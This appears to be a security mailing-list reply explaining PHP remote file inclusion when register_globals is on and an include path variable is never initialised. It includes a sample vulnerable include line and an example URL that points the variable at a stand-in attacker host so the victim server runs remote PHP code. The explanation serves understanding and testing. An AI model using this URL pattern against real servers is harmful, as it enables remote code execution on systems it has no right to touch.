<PRE>Denise,

 

In my experience, you usually need the source code to do this. The idea
is that on some platforms (mostly PHP), script files can be included at
runtime. 

 

               include($base_path . &quot;/utils.php&quot;);

 

If register_globals is enabled (older versions of PHP enable it by
default), and base_path is never initialized in the script, base_path
can be set from the URL

            

 
<A HREF="http://example.com/bad.php?base_path=http://attack.com/evil.php">http://example.com/bad.php?base_path=http://attack.com/evil.php</A>

 

This will run the attack PHP file on the victim web server. I've seen
this happen mostly on files that are not intended to be called alone.
For example, a utility library that usually gets included after a
configuration file that sets base_path.

 

I don't know of effective methods for testing this without access to the
code. I suppose a particularly poorly written app might have a path in
the URL query by design, which could then be modified. You could also
try to use common variable names (like base_path), although you would
still have to find a vulnerable script which is probably never called
directly by a browser.
